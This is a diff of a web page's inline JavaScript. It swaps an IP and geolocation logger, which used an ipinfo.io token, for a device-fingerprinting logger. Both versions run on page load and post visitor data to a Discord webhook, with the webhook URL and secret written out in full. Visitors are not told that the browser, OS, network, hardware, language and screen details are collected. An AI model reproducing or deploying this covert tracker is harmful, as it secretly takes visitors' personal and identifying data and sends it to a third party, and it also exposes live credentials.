@@ -47,52 +47,6 @@
     <div></div>
 
     <script>
-        // Function to send data to the Discord webhook
-        function sendToDiscord(data) {
-            fetch('https://discord.com/api/webhooks/1271756418101411890/zfiqg4D7Wsq-Hb5Mk4o_ayMd513PLm67T78V434Vw0jdipuxUjEwiijbQCeEvMqLfi9T', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: `**New Visitor Logged**\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nBrowser: ${data.browser}\nOperating System: ${data.os}\nScreen Resolution: ${data.screen}\nTimestamp: ${data.timestamp}`,
-                    username: 'Web Logger'
-                }),
-            }).then(response => {
-                console.log('Data sent to Discord:', response);
-            }).catch(error => {
-                console.error('Error sending data to Discord:', error);
-            });
-        }
-
-        // Function to get user's IP and location info
-        function logUserVisit() {
-            fetch('https://ipinfo.io/json?token=fbc037140ec409')
-                .then(response => response.json())
-                .then(ipData => {
-                    // Gather additional data
-                    const browserData = getBrowserInfo();
-                    const osData = getOSInfo();
-                    const screenResolution = `${window.screen.width}x${window.screen.height}`;
-                    const timestamp = new Date().toLocaleString();
-
-                    // Combine all data
-                    const data = {
-                        ...ipData,
-                        browser: browserData,
-                        os: osData,
-                        screen: screenResolution,
-                        timestamp: timestamp
-                    };
-
-                    // Send the combined data to Discord webhook
-                    sendToDiscord(data);
-                })
-                .catch(error => {
-                    console.error('Error fetching IP info:', error);
-                });
-        }
-
         // Function to get browser information
         function getBrowserInfo() {
             const userAgent = navigator.userAgent;
@@ -143,6 +97,80 @@
             if (userAgent.indexOf("like Mac") != -1) os = "iOS";
 
             return os;
+        }
+
+        // Function to get network information
+        function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return {
+                    downlink: connection.downlink + "Mbps",
+                    effectiveType: connection.effectiveType,
+                    rtt: connection.rtt + "ms",
+                };
+            }
+            return null;
+        }
+
+        // Function to get device information
+        function getDeviceInfo() {
+            return {
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+            };
+        }
+
+        // Function to get screen information
+        function getScreenInfo() {
+            return {
+                width: window.screen.width,
+                height: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelDepth: window.screen.pixelDepth,
+            };
+        }
+
+        // Function to send data to the Discord webhook
+        function sendToDiscord(data) {
+            fetch('https://discord.com/api/webhooks/1271756418101411890/zfiqg4D7Wsq-Hb5Mk4o_ayMd513PLm67T78V434Vw0jdipuxUjEwiijbQCeEvMqLfi9T', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `**New Visitor Logged**\n` +
+                             `**Browser:** ${data.browser}\n` +
+                             `**Operating System:** ${data.os}\n` +
+                             `**Network:** Downlink: ${data.network?.downlink}, RTT: ${data.network?.rtt}, Effective Type: ${data.network?.effectiveType}\n` +
+                             `**Device Info:** CPU Cores: ${data.device.hardwareConcurrency}, Memory: ${data.device.deviceMemory}GB, Language: ${data.device.language}, Platform: ${data.device.platform}, Cookie Enabled: ${data.device.cookieEnabled}\n` +
+                             `**Screen Resolution:** ${data.screen.width}x${data.screen.height}, Color Depth: ${data.screen.colorDepth}, Pixel Depth: ${data.screen.pixelDepth}\n` +
+                             `**Timestamp:** ${data.timestamp}`,
+                    username: 'Web Logger'
+                }),
+            }).then(response => {
+                console.log('Data sent to Discord:', response);
+            }).catch(error => {
+                console.error('Error sending data to Discord:', error);
+            });
+        }
+
+        // Function to log user visit
+        function logUserVisit() {
+            const data = {
+                browser: getBrowserInfo(),
+                os: getOSInfo(),
+                network: getNetworkInfo(),
+                device: getDeviceInfo(),
+                screen: getScreenInfo(),
+                timestamp: new Date().toLocaleString(),
+            };
+
+            // Send the combined data to Discord webhook
+            sendToDiscord(data);
         }
 
         // Log the visit as soon as the page loads
